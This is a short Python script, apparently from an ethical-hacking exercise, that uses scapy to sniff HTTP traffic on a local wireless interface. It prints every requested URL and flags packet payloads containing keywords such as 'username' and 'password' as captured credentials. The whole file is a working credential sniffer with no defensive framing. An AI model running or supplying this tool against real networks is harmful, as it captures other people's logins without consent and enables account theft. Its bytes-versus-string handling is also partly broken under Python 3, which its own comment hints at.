#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    """
        prn is to call a callback function for everytime the function is called
    """
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", 'user', 'login', 'password','pass']
        for kw in keywords:
            if kw in load:
                return load

def process_sniffed_packet(packet):
    """
        Only works with HTTP
    """
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request > " + url) #url.decode() python3? 
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > "+login_info+ "\n\n")
    print(packet.show())


sniff("wlp4s0")
